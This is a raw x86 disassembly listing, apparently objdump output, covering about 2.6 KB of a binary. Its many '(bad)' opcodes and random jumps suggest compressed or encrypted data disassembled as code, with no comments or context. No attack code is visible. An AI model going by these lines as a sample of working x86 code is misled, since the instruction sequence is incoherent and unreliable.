  42e86d:	and    DWORD PTR [ebx-0x2c],edx
  42e870:	fldcw  WORD PTR [esi-0x80]
  42e873:	push   ebp
  42e874:	mov    bh,0x5a
  42e876:	add    ebx,DWORD PTR [esi-0x3cf59d76]
  42e87c:	mov    edx,0xfa630f4c
  42e881:	dec    esp
  42e882:	popa   
  42e883:	lahf   
  42e884:	lahf   
  42e885:	mov    es,WORD PTR [esp+edi*1]
  42e888:	add    ebx,DWORD PTR [edi+0x64b637dd]
  42e88e:	dec    esi
  42e88f:	adc    al,0xde
	...
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	add    bl,al
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0x14dc07d5]
  42e901:	pop    ebp
  42e902:	xchg   esp,eax
  42e903:	mov    edx,0x1f368
  42e908:	add    eax,0xe9000001
  42e90d:	mov    ah,0x16
  42e90f:	sbb    al,0xc1
  42e911:	sahf   
  42e912:	fsub   DWORD PTR [edi]
  42e914:	mov    esp,0xe6fbee6f
  42e919:	mov    eax,0x4ca410a1
  42e91e:	jecxz  0x42e8b6
  42e920:	retf   0x2ae
  42e923:	jnp    0x42e8d8
  42e925:	sub    eax,0x64d1010c
  42e92a:	test   al,0x84
  42e92c:	push   ecx
  42e92d:	and    eax,0xe240c91a
  42e932:	xchg   esp,eax
  42e933:	bound  ecx,QWORD PTR [eax-0x426d411b]
  42e939:	(bad)  
  42e93a:	(bad)  
  42e93b:	ds xchg edx,eax
  42e93d:	mov    ds:0x97916281,eax
  42e942:	repnz xor edx,DWORD PTR [ebx-0x1f]
  42e946:	mov    DWORD PTR ds:0xcc5c6099,edx
  42e94c:	dec    esi
  42e94d:	xchg   esp,eax
  42e94e:	pop    ebp
  42e94f:	stc    
  42e950:	pop    es
  42e951:	fcomp  DWORD PTR [ebx+0x526fe5aa]
  42e957:	xchg   ebx,eax
  42e958:	pop    es
  42e959:	dec    esi
  42e95a:	push   edi
  42e95b:	fadd   QWORD PTR [esi+0x5e]
  42e95e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e95f:	in     eax,0x5
  42e961:	xor    eax,0x202e281f
  42e966:	cdq    
  42e967:	xor    ah,dl
  42e969:	(bad)  
  42e96a:	sub    al,0xb
  42e96c:	(bad)  
  42e96d:	aas    
  42e96e:	fadd   st,st(5)
  42e970:	adc    eax,0xe0dfe2bb
  42e975:	imul   edx,DWORD PTR [edx-0x57],0xfffffff3
  42e979:	fucom  st(3)
  42e97b:	leave  
  42e97c:	imul   ebp,DWORD PTR [edx],0x27
  42e97f:	jno    0x42e914
  42e981:	sub    al,0x42
  42e983:	pop    es
  42e984:	and    al,0x68
  42e986:	mov    esi,0x43a8ff43
  42e98b:	bound  ebp,QWORD PTR ds:0x6608eaee
  42e991:	or     cx,bp
  42e994:	mov    edi,0x2feaf44b
  42e999:	dec    ecx
  42e99a:	jl     0x42e91d
  42e99c:	ficom  DWORD PTR [edx]
  42e99e:	idiv   BYTE PTR ds:0xc9f88c85
  42e9a4:	xor    ebx,DWORD PTR [edx-0x55]
  42e9a7:	pop    edi
  42e9a8:	ins    DWORD PTR es:[edi],dx
  42e9a9:	cdq    
  42e9aa:	dec    ebx
  42e9ab:	imul   esi,DWORD PTR [esp+edi*1-0x71f638af],0xffffffbf
  42e9b3:	ja     0x42e9b5
  42e9b5:	and    ah,BYTE PTR [ecx+ebx*1-0x4]
  42e9b9:	(bad)
  42e9bc:	pop    ebx
  42e9bd:	mov    dl,0xd2
  42e9bf:	cmc    
  42e9c0:	adc    al,0x45
  42e9c2:	fs mov bl,0xc4
  42e9c5:	dec    edi
  42e9c6:	cdq    
  42e9c7:	faddp  st(3),st
  42e9c9:	retf   0xd4bf
  42e9cc:	cmp    al,0x5a
  42e9ce:	pop    ecx
  42e9cf:	lock push 0x39082c60
  42e9d5:	adc    al,0xc6
  42e9d7:	jg     0x42e9a5
  42e9d9:	mov    esp,0xc4f88a30
  42e9de:	and    DWORD PTR [ecx+0x41],ebp
  42e9e1:	das    
  42e9e2:	daa    
  42e9e3:	std    
  42e9e4:	leave  
  42e9e5:	or     ecx,DWORD PTR [eax-0x30fddde5]
  42e9eb:	mov    edi,0xd95d722c
  42e9f0:	mov    ebx,0x43c280bc
  42e9f5:	push   ecx
  42e9f6:	mov    eax,0xda02262b
  42e9fb:	shl    ebx,cl
  42e9fd:	cmp    eax,0x3c445211
  42ea02:	push   eax
  42ea03:	push   ebx
  42ea04:	(bad)  
  42ea05:	jge    0x42e9ed
  42ea07:	cmp    DWORD PTR ds:0x38fd55ea,ecx
  42ea0d:	xchg   esp,eax
  42ea0e:	std    
  42ea0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ea10:	dec    edi
	...
  42ea71:	add    BYTE PTR [eax],al
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	ret    0xad3a
  42ea83:	or     ch,BYTE PTR [ebp-0xc]
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0xd5000001
  42ea8d:	dec    esi
  42ea8e:	fcomp  DWORD PTR [esi]
  42ea90:	xchg   edx,eax
  42ea91:	(bad)  
  42ea92:	lahf   
  42ea93:	lods   al,BYTE PTR ds:[esi]
  42ea94:	pop    es
  42ea95:	dec    esp
  42ea96:	(bad)  
  42ea97:	shl    BYTE PTR [ebp+0x363b92fd],cl
  42ea9d:	mov    WORD PTR [ecx],ds
  42ea9f:	sub    eax,0x875613f4
  42eaa4:	jge    0x42ea62
  42eaa6:	sub    BYTE PTR [edx],bh
  42eaa8:	adc    esp,DWORD PTR [edi+0x16fd6bff]
  42eaae:	test   eax,0x76beba69
  42eab3:	jmp    0x42ea8c
  42eab5:	mov    al,ds:0xafce8755
  42eaba:	inc    esi
  42eabb:	jg     0x42ea94
  42eabd:	xor    al,0x1d
  42eabf:	jmp    0x862a90cf
  42eac4:	hlt    
  42eac5:	aaa    
  42eac6:	cs pushf 
  42eac8:	pushf  
  42eac9:	or     ebp,DWORD PTR [esi-0x5be8b204]
  42eacf:	mov    DWORD PTR [eax-0x2753a88d],0xa221fd08
  42ead9:	mov    al,0xb7
  42eadb:	pusha  
  42eadc:	popa   
  42eadd:	sbb    al,0xcc
  42eadf:	jmp    0x116e93fc
  42eae4:	mov    ?,WORD PTR [esi]
  42eae6:	push   cs
  42eae7:	sbb    cl,BYTE PTR [ebx-0x72ffa89e]
  42eaed:	rcr    BYTE PTR [ebx-0x51b51f37],cl
  42eaf3:	les    ebp,FWORD PTR [ecx]
  42eaf5:	adc    dl,0xa5
  42eaf8:	and    DWORD PTR [eax-0x25c5af68],eax
  42eafe:	mov    ds:0xf96b6bff,al
  42eb03:	or     eax,0x955adaaf
  42eb08:	adc    ebp,DWORD PTR [ebx-0x51]
  42eb0b:	cdq    
  42eb0c:	idiv   DWORD PTR ds:0x848c25bf
  42eb12:	out    dx,eax
  42eb13:	cmp    eax,ebx
  42eb15:	out    0xfa,al
  42eb17:	cmc    
  42eb18:	out    dx,al
  42eb19:	ret    0xa6e1
  42eb1c:	and    bl,bl
  42eb1e:	jg     0x42eaa9
  42eb20:	jle    0x42eab0
  42eb22:	jl     0x42eab1
  42eb24:	and    eax,0x796c2f79
  42eb29:	stos   DWORD PTR es:[edi],eax
  42eb2a:	jmp    0xeb57c08c
  42eb2f:	jp     0x42eb80
  42eb31:	stos   BYTE PTR es:[edi],al
  42eb32:	push   es
  42eb33:	call   0xe30b1434
  42eb38:	out    dx,al
  42eb39:	jmp    0x42eb78
  42eb3b:	in     al,dx
  42eb3c:	push   edi
  42eb3d:	(bad)  
  42eb3e:	aas    
  42eb3f:	push   eax
  42eb40:	or     BYTE PTR [eax],cl
  42eb42:	retf   
  42eb43:	mov    cl,0x54
  42eb45:	fsub   QWORD PTR [esi+0x1d]
  42eb48:	retf   
  42eb49:	xchg   esi,eax
  42eb4a:	mov    WORD PTR [esi],ss
  42eb4c:	pushf  
  42eb4d:	arpl   WORD PTR [ebp-0x3b],dx
  42eb50:	bound  esi,QWORD PTR ds:0x4f8b6a3a
  42eb56:	sub    DWORD PTR [eax-0x193bcecb],0x2a75b30b
  42eb60:	loope  0x42eae3
  42eb62:	sub    BYTE PTR [esi+0x71],al
  42eb65:	out    dx,eax
  42eb66:	jo     0x42ebbc
  42eb68:	sti    
  42eb69:	or     ebp,edx
  42eb6b:	js     0x42ebbd
  42eb6d:	add    al,0x52
  42eb6f:	jb     0x42eba7
  42eb71:	jmp    0xb693:0xaab45d43
  42eb78:	div    BYTE PTR [esi+0x11]
  42eb7b:	mov    esp,0xacd09682
  42eb80:	jmp    0x2a0c83d4
  42eb85:	cmp    eax,edi
  42eb87:	mov    ebx,0xba97d07f
  42eb8c:	std    
  42eb8d:	dec    esi
  42eb8e:	inc    edx
  42eb8f:	inc    edx
  42eb90:	jmp    0x42eb95
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	sub    ebx,0x728a245e
  42ec05:	cmc    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    eax,0x92000001
  42ec0d:	inc    esp
  42ec0e:	(bad)  
  42ec10:	into   
  42ec11:	adc    DWORD PTR [edi-0x3aaf22eb],ebp
  42ec17:	cmp    al,0xd0
  42ec19:	out    0x41,eax
  42ec1b:	dec    esi
  42ec1c:	in     eax,dx
  42ec1d:	pusha  
  42ec1e:	rcl    BYTE PTR [ecx+0x5],1
  42ec21:	sar    esp,1
  42ec23:	scas   eax,DWORD PTR es:[edi]
  42ec24:	sbb    esp,DWORD PTR [ebp+0x611e0b67]
  42ec2a:	dec    ebp
  42ec2b:	push   esp
  42ec2c:	cmp    DWORD PTR ss:[edx+0x2ca1ddfd],eax
  42ec33:	mov    bh,0x1a
  42ec35:	bound  ebp,QWORD PTR [ebx]
  42ec37:	nop
  42ec38:	out    dx,al
  42ec39:	push   ds
  42ec3a:	cld    
  42ec3b:	int3   
  42ec3c:	mov    edx,0xe686d09f
  42ec41:	sub    al,0x7c
  42ec43:	ss add ah,bl
  42ec46:	ret    
  42ec47:	bound  edx,QWORD PTR [ecx+0x3cfc25ab]
  42ec4d:	sbb    dh,0xa4
  42ec50:	adc    al,0x7d
  42ec52:	mov    ecx,DWORD PTR [ebp-0x4d4a684d]
  42ec58:	outs   dx,BYTE PTR ds:[esi]
  42ec59:	push   edi
  42ec5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec5b:	fcompp 
  42ec5d:	vpcmpeqw xmm5,xmm4,XMMWORD PTR [edx-0x43dfc665]
  42ec66:	stos   DWORD PTR es:[edi],eax
  42ec67:	gs mov bl,dl
  42ec6a:	in     eax,dx
  42ec6b:	mov    dh,0xe3
  42ec6d:	je     0x42ec58
  42ec6f:	and    eax,0xb4a2854
  42ec74:	inc    ebx
  42ec75:	push   edx
  42ec76:	mov    fs,esi
  42ec78:	je     0x42ec41
  42ec7a:	lock add eax,0x1cacab8d
  42ec80:	(bad)
  42ec84:	rcl    dh,1
  42ec86:	imul   esi,DWORD PTR [eax-0x59],0x1318e004
  42ec8d:	in     eax,0x8e
  42ec8f:	(bad)  
  42ec90:	pop    edi
  42ec91:	add    dh,BYTE PTR [eax-0x41]
  42ec94:	pusha  
  42ec95:	mov    cl,0x79
  42ec97:	out    0xa9,eax
  42ec99:	fistp  WORD PTR [edi-0x1787899b]
  42ec9f:	scas   al,BYTE PTR es:[di]
  42eca1:	jmp    0x52a0ac18
  42eca6:	(bad)  
  42eca7:	repnz cmp eax,0x555f20c9
  42ecad:	mov    esi,0x1205ea42
  42ecb2:	call   0x970a9935
  42ecb7:	add    bl,dl
  42ecb9:	cmp    esp,ebx
  42ecbb:	popa   
  42ecbc:	test   eax,0xfafa3d41
  42ecc1:	sub    eax,0xe822c590
  42ecc6:	test   eax,0x78a081b1
  42eccb:	dec    ebp
  42eccc:	sti    
  42eccd:	into   
  42ecce:	add    al,0x90
  42ecd0:	loop   0x42eca3
  42ecd2:	cmp    al,0x20
  42ecd4:	pushf  
  42ecd5:	mov    edx,0xc42f0680
  42ecda:	pop    ss
  42ecdb:	jmp    0x2df1896a
  42ece0:	xchg   ecx,eax
  42ece1:	ror    BYTE PTR [edx+0x6473cc95],0x58
  42ece8:	sub    eax,edx
  42ecea:	mov    eax,ds:0x1881b3d
  42ecef:	and    bh,al
  42ecf1:	pop    ecx
  42ecf2:	(bad)  
  42ecf4:	cmc    
  42ecf5:	sub    al,0x2f
  42ecf7:	sbb    al,ch
  42ecf9:	(bad)  
  42ecfa:	aas    
  42ecfb:	add    eax,0x21d55dd6
  42ed00:	repz jmp 0xab46:0x406867b
  42ed08:	fbld   TBYTE PTR [ebp+0x29]
  42ed0b:	and    edi,ebp
  42ed0d:	dec    esp
  42ed0e:	outs   dx,DWORD PTR es:[esi]
  42ed10:	push   ecx
	...
  42ed71:	add    BYTE PTR [eax],al
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp+0x226d04a2]
  42ed83:	xor    DWORD PTR [edi-0xa],esi
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0x21000001
  42ed8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ed8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ed8f:	sub    ebp,DWORD PTR [eax]
  42ed91:	retf   0xa92b
  42ed94:	bsr    esi,DWORD PTR [ebx-0x4b]
  42ed98:	inc    ebx
  42ed99:	fmulp  st(1),st
  42ed9b:	mov    eax,ds:0xdde34614
  42eda0:	mov    esp,0xdeaf9d6d
  42eda5:	and    eax,0xda994cf3
  42edaa:	and    ch,ah
  42edac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42edad:	pop    ds
  42edae:	ror    BYTE PTR [edi],0x30
  42edb1:	mov    esp,0xa56166c7
  42edb6:	ret    0x877d
  42edb9:	iret   
  42edba:	loop   0x42ed76
  42edbc:	int    0x7
  42edbe:	xchg   ecx,eax
  42edbf:	out    dx,al
  42edc0:	xor    eax,DWORD PTR [edi+0x22]
  42edc3:	stos   BYTE PTR es:[edi],al
  42edc4:	lock xchg ecx,eax
  42edc6:	dec    edi
  42edc7:	push   0x1c
  42edc9:	or     al,0xf1
  42edcb:	adc    BYTE PTR gs:[eax],bh
  42edce:	ret    
  42edcf:	test   cl,bh
  42edd1:	push   eax
  42edd2:	test   eax,0xb93c5740
  42edd7:	sbb    ah,BYTE PTR [edx]
  42edd9:	jecxz  0x42ee45
  42eddb:	and    BYTE PTR [esi-0x2c],bl
  42edde:	cmc    
  42eddf:	jno    0x42edd8
  42ede1:	add    BYTE PTR [ecx-0x6e],cl
  42ede4:	imul   edx
  42ede6:	dec    esp
  42ede7:	xchg   ecx,eax
  42ede8:	call   FWORD PTR [edx+0x4e425ce]
  42edee:	xor    DWORD PTR ds:0x2ccb0352,eax
  42edf4:	jecxz  0x42ed7d
  42edf6:	sahf   
  42edf7:	push   ds
  42edf8:	(bad)  
  42edf9:	inc    ecx
  42edfa:	mov    edx,0xb7d74497
  42edff:	or     eax,0x812e872d
  42ee04:	popfw  
  42ee06:	(bad)  
  42ee07:	test   al,0x27
  42ee09:	xchg   cx,si
  42ee0c:	xchg   ecx,eax
  42ee0d:	std    
  42ee0e:	fld1   
  42ee10:	pop    ebp
  42ee11:	fsub   DWORD PTR fs:[edx]
  42ee14:	mov    al,0xce
  42ee16:	popf   
  42ee17:	sbb    DWORD PTR [ecx],0xffffff9f
  42ee1a:	mov    BYTE PTR [ecx-0x6f],dh
  42ee1d:	fwait
  42ee1e:	iret   
  42ee1f:	push   esi
  42ee20:	pop    ecx
  42ee21:	xor    al,0x3b
  42ee23:	jbe    0x42ee4c
  42ee25:	call   0xf507:0x1f993807
  42ee2c:	jbe    0x42ee44
  42ee2e:	jo     0x42ee75
  42ee30:	add    DWORD PTR [edi+eiz*4],edi
  42ee33:	aas    
  42ee34:	xchg   ecx,eax
  42ee35:	loop   0x42ee5b
  42ee37:	push   ebx
  42ee38:	lods   al,BYTE PTR ds:[esi]
  42ee39:	mov    bl,0xf6
  42ee3b:	retf   
  42ee3c:	push   edi
  42ee3d:	mov    WORD PTR [ebp+ebx*2+0x32],cs
  42ee41:	mov    dl,0xeb
  42ee43:	popf   
  42ee44:	sbb    esp,eax
  42ee46:	retf   0xdc80
  42ee49:	(bad)  
  42ee4a:	shl    DWORD PTR [eax+0x6e],1
  42ee4d:	cwde   
  42ee4e:	dec    esp
  42ee4f:	dec    ebx
  42ee50:	(bad)  
  42ee52:	cmc    
  42ee53:	sub    al,ch
  42ee55:	xor    eax,0x311a76ae
  42ee5a:	jae    0x42edfe
  42ee5c:	ds sbb eax,0xffffffdb
  42ee60:	pop    esp
  42ee61:	jp     0x42ee7a
  42ee63:	jae    0x42ee4a
  42ee65:	mov    bl,0xa6
  42ee67:	jmp    0x42ee20
  42ee69:	es test al,0x46
  42ee6c:	js     0x42ee2c
  42ee6e:	es sub eax,0xcb133e5c
  42ee74:	call   0xbddd8512
  42ee79:	retf   0x4999
  42ee7c:	mov    ebp,DWORD PTR [eax+0x1fe5bafd]
  42ee82:	mov    eax,0xe0aa8df8
  42ee87:	(bad)  [ecx+0x2f]
  42ee8a:	jge    0x42eee5
  42ee8c:	adc    ecx,DWORD PTR [edi+0x37]
  42ee8f:	push   cs
  42ee90:	mov    eax,0x0
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	inc    esi
  42ef01:	cdq    
  42ef02:	ins    DWORD PTR es:[edi],dx
  42ef03:	jns    0x42ef81
  42ef05:	test   DWORD PTR [ecx],0x10500
  42ef0b:	add    BYTE PTR [ebx+0x7],bl
  42ef0e:	daa    
  42ef0f:	xor    ebp,DWORD PTR [ebx+0x7ffa9ea3]
  42ef15:	mov    ch,0xfa
  42ef17:	add    DWORD PTR [edx],ebp
  42ef19:	adc    eax,0xffca5eff
  42ef1e:	lea    esi,[edx+eax*1+0x2bccb8e]
  42ef25:	and    al,0x9a
  42ef27:	push   esp
  42ef28:	(bad)  
  42ef29:	xchg   edx,eax
  42ef2a:	sbb    al,ah
  42ef2c:	adc    eax,0x5988713
  42ef31:	ja     0x42ef73
  42ef33:	jge    0x42eebb
  42ef35:	jmp    0x916a323d
  42ef3a:	pop    edx
  42ef3b:	cmp    DWORD PTR [esi],edi
  42ef3d:	jno    0x42ef2c
  42ef3f:	or     eax,0x915e5d86
  42ef44:	in     eax,0x9d
  42ef46:	pop    eax
  42ef47:	pop    ds
  42ef48:	add    esp,DWORD PTR [edi]
  42ef4a:	jmp    0xd095:0x1b496a67
  42ef51:	dec    edi
  42ef52:	repz dec esp
  42ef54:	add    DWORD PTR [edi],esp
  42ef56:	mul    edx
  42ef58:	push   0xffffff87
  42ef5a:	pushf  
  42ef5b:	pop    esi
  42ef5c:	mov    esp,0xd7c12413
  42ef61:	std    
  42ef62:	fld    QWORD PTR [edi-0x6a]
  42ef65:	dec    ebp
  42ef66:	(bad)  
  42ef67:	(bad)  
  42ef69:	mov    dl,0x1b
  42ef6b:	mov    eax,ds:0xdd6a31de
  42ef70:	int3   
  42ef71:	mov    DWORD PTR [edx+0x7e405748],esp
  42ef77:	out    0xd,eax
  42ef79:	sbb    DWORD PTR [edx],edx
  42ef7b:	adc    BYTE PTR [eax],bl
  42ef7d:	(bad)  
  42ef7e:	enter  0xdab,0x18
  42ef82:	xchg   edi,eax
  42ef83:	sub    eax,0x99b7f224
  42ef88:	cmp    ebx,DWORD PTR [esp+edx*1]
  42ef8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef8c:	xchg   esi,eax
  42ef8d:	xor    BYTE PTR [esi],bh
  42ef8f:	mov    dl,0x6d
  42ef91:	add    al,0xf2
  42ef93:	xor    al,0xce
  42ef95:	cwde   
  42ef96:	ss jne 0x42efe8
  42ef99:	pop    ebp
  42ef9a:	clc    
  42ef9b:	cmp    BYTE PTR [esi-0x5f],ch
  42ef9e:	(bad)
  42efa1:	sub    edi,DWORD PTR [edx-0x75]
  42efa4:	pushf  
  42efa5:	jl     0x42efab
  42efa7:	xchg   esp,eax
  42efa8:	inc    ebp
  42efa9:	or     eax,0xcadded15
  42efae:	mov    bl,0xc5
  42efb0:	sbb    BYTE PTR ds:0xa5bffa96,ah
  42efb6:	xchg   esp,eax
  42efb7:	mov    ds,WORD PTR [edi+0x19]
  42efba:	pushf  
  42efbb:	into   
  42efbc:	add    edx,ecx
  42efbe:	xlat   BYTE PTR ds:[ebx]
  42efbf:	add    BYTE PTR [edx+0x20],dl
  42efc2:	jp     0x42f02d
  42efc4:	outs   dx,BYTE PTR ds:[esi]
  42efc5:	rcr    BYTE PTR [edx],0xe7
  42efc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efc9:	jl     0x42f046
  42efcb:	mov    eax,0x66257bf
  42efd0:	add    al,0x2e
  42efd2:	inc    ebx
  42efd3:	jb     0x42ef5e
  42efd5:	sub    esp,DWORD PTR [edi+0xda75e68]
  42efdb:	or     BYTE PTR [ecx+0x103ddf2f],al
  42efe1:	in     eax,dx
  42efe2:	xor    BYTE PTR [edx],ch
  42efe4:	inc    ah
  42efe6:	jecxz  0x42f004
  42efe8:	xlat   BYTE PTR ds:[ebx]
  42efe9:	mov    ecx,0xec762a4a
  42efee:	ror    bl,1
  42eff0:	mov    dh,0xda
  42eff2:	xchg   edx,eax
  42eff3:	push   eax
  42eff4:	mov    esp,0xc54c26a2
  42eff9:	xchg   ecx,eax
  42effa:	fwait
  42effb:	jae    0x42ef8a
  42effd:	enter  0xe13,0x81
  42f001:	and    bl,dh
  42f003:	nop
  42f004:	fs mov fs,ebp
  42f007:	loope  0x42f030
  42f009:	and    esi,ebx
  42f00b:	ins    DWORD PTR es:[edi],dx
  42f00c:	adc    DWORD PTR [edi+0x24f21e],esp
	...
  42f072:	add    BYTE PTR [eax],al
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	out    dx,eax
  42f081:	sahf   
  42f082:	cmp    DWORD PTR [edi-0x7f],0xfffffff8
  42f086:	add    DWORD PTR [eax],eax
  42f088:	add    eax,0x2f000001
  42f08d:	call   0xfaeccf65
  42f092:	dec    di
  42f094:	es pop es
  42f096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f097:	jno    0x42f071
  42f099:	push   ebx
  42f09a:	xor    BYTE PTR [ecx],cl
  42f09c:	fwait
  42f09d:	inc    ebp
  42f09e:	addr16 loop 0x42f0c3
  42f0a1:	add    eax,0x85e287a3
  42f0a6:	mov    ch,cl
  42f0a8:	xchg   ebp,eax
  42f0a9:	aas    
  42f0aa:	popf   
  42f0ab:	sub    BYTE PTR [esi+eiz*8+0x11856e06],al
  42f0b2:	fiadd  WORD PTR [edi-0x3b9d5711]
  42f0b8:	shl    DWORD PTR [ecx],0xff
  42f0bb:	xor    BYTE PTR [ebp-0x6f674dff],ah
  42f0c1:	push   ds
  42f0c2:	xchg   ecx,eax
  42f0c3:	or     al,0x32
  42f0c5:	cs sub dh,dl
  42f0c8:	lahf   
  42f0c9:	xchg   ebp,eax
  42f0ca:	xor    ch,al
  42f0cc:	inc    eax
  42f0cd:	sub    al,0xa
  42f0cf:	mov    bl,0xbb
  42f0d1:	fild   QWORD PTR [edx]
  42f0d3:	jle    0x42f110
  42f0d5:	out    dx,eax
  42f0d6:	mov    ds:0xa113b651,eax
  42f0db:	sti    
  42f0dc:	xor    ch,dh
  42f0de:	xchg   esp,eax
  42f0df:	ror    DWORD PTR [eax-0x7ea1d7ff],1
  42f0e5:	es fsin 
  42f0e8:	mov    esi,0x5523da8
  42f0ed:	adc    ecx,DWORD PTR [ebp+0x63d464be]
  42f0f3:	and    esi,DWORD PTR [ebx]
  42f0f5:	inc    ebp
  42f0f6:	mov    cl,0xa8
  42f0f8:	mov    ds:0x59a3824a,al
  42f0fd:	stos   DWORD PTR es:[edi],eax
  42f0fe:	xor    al,0xbe
  42f100:	add    esi,DWORD PTR [edx+esi*4]
  42f103:	sbb    bl,BYTE PTR [ebx+0x4b1ca2e5]
  42f109:	dec    edx
  42f10a:	aaa    
  42f10b:	push   es
  42f10c:	dec    edx
  42f10d:	jp     0x42f0f4
  42f10f:	sub    esp,edx
  42f111:	ror    BYTE PTR [ecx+0x3da980c1],1
  42f117:	call   0x9281:0x36540046
  42f11e:	inc    ebx
  42f11f:	dec    esp
  42f120:	cmp    eax,0x5e4871f
  42f125:	sub    edi,DWORD PTR [eax-0x72]
  42f128:	fwait
  42f129:	mov    edx,0x13a7a8db
  42f12e:	jnp    0x42f0bc
  42f130:	cmp    ebp,DWORD PTR [edx-0x28]
  42f133:	cmp    cl,dh
  42f135:	popf   
  42f136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f137:	shl    ecx,0x1b
  42f13a:	jnp    0x42f17b
  42f13c:	adc    al,0xce
  42f13e:	mov    DWORD PTR [esi],0x1f898106
  42f144:	mov    ecx,0xb705573e
  42f149:	jmp    0xb9ce9fdd
  42f14e:	lahf   
  42f14f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f150:	lods   al,BYTE PTR ds:[esi]
  42f151:	fstp   QWORD PTR [ecx+0x6378a365]
  42f157:	lods   eax,DWORD PTR ds:[esi]
  42f158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f159:	mov    ecx,0xbe8af3f
  42f15e:	inc    edx
  42f15f:	jno    0x42f166
  42f161:	xchg   BYTE PTR ds:0xbc9eb322,ch
  42f167:	retf   0xec56
  42f16a:	jge    0x42f131
  42f16c:	push   edi
  42f16d:	repnz xor eax,0xeba2ab18
  42f173:	inc    esi
  42f174:	adc    dl,BYTE PTR [edx-0x1b3fa76e]
  42f17a:	rol    dh,0xf7
  42f17d:	and    BYTE PTR [edx+0x5f],0xcb
  42f181:	mov    edx,DWORD PTR [edx+0x76]
  42f184:	call   DWORD PTR [esi+0x27]
  42f187:	cmp    dl,BYTE PTR [esi-0x3c]
  42f18a:	or     eax,0x4a60b053
  42f18f:	loop   0x42f1c7
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	pop    ss
  42f201:	ja     0x42f224
  42f203:	xchg   esi,eax
  42f204:	xchg   cl,bh
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0x8a000001
  42f20d:	adc    eax,0x72a88486
  42f212:	dec    eax
  42f213:	push   esi
  42f214:	jge    0x42f283
  42f216:	mov    ebp,0x10bb4f52
  42f21b:	fsubrp st(2),st
  42f21d:	ds xchg edi,eax
  42f21f:	adc    ebx,edx
  42f221:	cmp    DWORD PTR [edi-0x1e04a7ec],ebx
  42f227:	repz mov WORD PTR [esi+0x53544501],cs
  42f22e:	sbb    al,0xde
  42f230:	adc    BYTE PTR [ebx+esi*8-0x55e3339a],ch
  42f237:	ret    
  42f238:	or     al,0xf9
  42f23a:	push   ds
  42f23b:	mul    DWORD PTR [ecx]
  42f23d:	xchg   edi,eax
  42f23e:	jmp    0x759cd10b
  42f243:	out    dx,eax
  42f244:	lock xlat BYTE PTR ds:[ebx]
  42f246:	into   
  42f247:	jmp    0x42f2ba
  42f249:	icebp  
  42f24a:	clc    
  42f24b:	enter  0x93c6,0xa5
  42f24f:	fisttp QWORD PTR [ebp-0x69bc87aa]
  42f255:	mov    cl,0xa2
  42f257:	mov    esi,0xd89d58dd
  42f25c:	sub    al,0xee
  42f25e:	and    cl,BYTE PTR [ebx+0x13ad48ff]
  42f264:	dec    ebx
  42f265:	ficom  DWORD PTR [edx]
  42f267:	inc    eax
  42f268:	push   esp
  42f269:	(bad)  [edi]
  42f26b:	sub    bh,cl
  42f26d:	dec    esp
  42f26e:	dec    eax
  42f26f:	jp     0x42f25a
  42f271:	mov    ah,0xc7
  42f273:	ins    DWORD PTR es:[edi],dx
  42f274:	sbb    eax,esp
  42f276:	mov    esi,0x164f985a
  42f27b:	outs   dx,DWORD PTR ds:[esi]
  42f27c:	cmp    eax,0xc1e65205
  42f281:	or     bh,dl
  42f283:	gs push edi
  42f285:	add    BYTE PTR [edi],bh
  42f287:	inc    ecx
  42f288:	push   0x4b
  42f28a:	adc    esi,ecx
  42f28c:	or     BYTE PTR [edi+0x3787546f],bh
  42f292:	stos   BYTE PTR es:[edi],al
  42f293:	fld    DWORD PTR [edx+0x23]
  42f296:	cmp    dl,ch
  42f298:	sub    BYTE PTR [esi-0x3c3ac2ad],dh
  42f29e:	push   ecx
  42f29f:	pop    eax
  42f2a0:	lahf   
  42f2a1:	les    edx,FWORD PTR [esi]
  42f2a3:	sub    eax,0xcdd077b6
  42f2a8:	fist   DWORD PTR [eax+0x5]
  42f2ab:	gs jmp 0x42f2a4
